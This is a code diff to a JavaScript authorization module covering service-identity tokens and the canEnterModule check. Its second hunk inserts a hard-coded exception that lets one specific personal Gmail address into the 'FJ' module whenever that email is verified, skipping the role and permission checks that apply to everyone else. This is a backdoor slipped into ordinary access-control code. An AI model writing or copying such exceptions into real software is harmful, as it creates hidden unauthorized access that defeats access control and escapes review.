@@ -82,7 +82,8 @@ export function serviceIdentity(credentials, station, {fetchImpl = fetch, now = 
         aud: 'https://identitytoolkit.googleapis.com/google.identity.identitytoolkit.v1.IdentityToolkit',
         iat, exp: iat + MODULE_LEASE_SECONDS, uid: actor.uid,
         claims: {sourceProjectId: FA_PROJECT, moduleStation: station, faAuthTime: actor.authTime,
-          moduleLeaseExpiresAt: iat + MODULE_LEASE_SECONDS}
+          moduleLeaseExpiresAt: iat + MODULE_LEASE_SECONDS,
+          ...(station === 'FJ' ? {faEmailVerified: actor.emailVerified === true} : {})}
       });
       return unsigned + '.' + sign('RSA-SHA256', Buffer.from(unsigned), key).toString('base64url');
     }
@@ -98,5 +99,6 @@ export function canEnterModule(profile, actor, station) {
   return profile?.uid === actor.uid && String(profile.email || '').toLowerCase() === actor.email &&
     profile.active === true && profile.access === true &&
     (station === 'FH' ? modulePermissions.some(permission => (permissions[permission] ?? permissions.admin) === true) :
-      (profile.role === 'administrador_app' || permissions.admin === true || modulePermissions.some(permission => permissions[permission] === true)));
+      (profile.role === 'administrador_app' || permissions.admin === true ||
+       (station === 'FJ' && actor.emailVerified === true && actor.email === 'marcio.henrique82@gmail.com') || modulePermissions.some(permission => permissions[permission] === true)));
 }
